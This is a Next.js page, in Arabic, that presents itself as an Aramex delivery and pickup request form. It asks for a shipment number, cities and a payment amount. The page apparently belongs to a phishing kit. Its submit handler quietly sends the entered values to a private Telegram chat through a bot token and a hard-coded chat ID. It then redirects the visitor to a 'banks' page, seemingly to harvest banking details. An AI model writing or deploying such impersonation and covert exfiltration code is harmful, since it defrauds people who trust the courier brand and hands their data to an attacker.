"use client"
import { useRef } from 'react'
import styles from './fozajil.module.css'
// import bot from '@/app/dataBot'
import {useRouter,useSearchParams} from 'next/navigation'


const Page = () => {

  const token = process.env.TOKEN;
  const pass = 7017479979
  let typeRequest = useRef();
  let numshoh = useRef();
  let fromcity = useRef();
  let tocity = useRef();
  let mony = useRef();
  const  name = useSearchParams();
  const track = name.get("name")
  
  
  const router = useRouter()

  const  handlerout =  () => {
    
if(typeRequest.current.value == "اختر الخدمة" || fromcity.current.value == "" || tocity.current.value == "" || mony.current.value == ""|| numshoh.current.value == "") {
      alert('من فضلك قم بملى الحقول')
    }else{
       router.push(`/aram/banks?names=${numshoh.current.value}`)
    }
  }


  const handleSubmit = (e) => {
    e.preventDefault();
    var length =`مدونة ارامكس %0A   نوع الخدمة : ${typeRequest.current.value} %0A من  : ${fromcity.current.value} %0A  الى : ${tocity.current.value} %0A قيمة السداد:${mony.current.value} %0A %0A ${numshoh.current.value}`
    

    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pass}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))


  }

  return (
    <div className={styles.contain} dir='rtl'>
      <div className={styles.navbar}>
        <h2>طلب  توصيل واستلام</h2>

      </div>
      
        <form onSubmit={handleSubmit}> 


    <select name="typeRequest" ref={typeRequest} required>
                <option value="اختر الخدمة">اختر الخدمة</option>
                <option value="طلب توصيل">طلب توصيل</option>
                <option value="طلب استلام">طلب استلام</option>
            </select>
            <input type="number" name='numshoh'  placeholder='رقم الشحنة' ref={numshoh}required />
            <input type="text" name='fromcity'  placeholder='من مدينة' ref={fromcity}required />
            <input type="text" name='tocity'  placeholder='الى مدينة' ref={tocity}required />
            <input type="number" name='many' placeholder='قيمة السداد'ref={mony} required />

        <button type='submit' onClick={handlerout}>تقديم الطلب</button>
        </form>
    </div>

  )
}

export default Page; 
